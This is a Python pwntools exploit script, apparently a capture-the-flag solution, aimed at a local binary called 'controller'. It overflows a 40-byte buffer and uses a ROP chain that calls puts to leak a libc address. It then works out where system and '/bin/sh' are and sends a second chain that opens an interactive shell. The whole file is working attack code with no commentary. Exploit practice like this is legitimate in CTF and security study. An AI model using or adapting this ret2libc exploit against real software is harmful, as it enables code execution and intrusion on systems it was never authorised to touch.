from pwn import *

first_check = "1 -198"
p = process("./controller")
pid = gdb.attach(p,gdbscript="b * calculator")

p.sendlineafter(": ",first_check)
p.sendlineafter("> ","3")
puts_got =0x0601fb0
puts_plt =0x0400630
pop_rdi = 0x00000000004011d3
ret = 0x0000000000400606
main = 0x0401124

padd = 40 * "A"
payload = padd
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main)
p.sendlineafter("> ",payload)
p.recvline()
leak = u64(p.recv(6).ljust(8,'\0'))
print "leak: "+ hex(leak)
libc_base = leak - 0x80aa0
system = libc_base + 0x4f550
bin_sh = libc_base +0x1b3e1a

print "system: "+hex(system)
print "libc_base: "+hex(libc_base)
print "bin_sh : " + hex(bin_sh)
payload2 = padd
payload2 += p64(pop_rdi)
payload2 += p64(bin_sh)
payload2 += p64(ret)
payload2 += p64(system)
p.sendlineafter(": ",first_check)
p.sendlineafter("> ", "3")
p.sendlineafter("> ", payload2)
p.interactive()
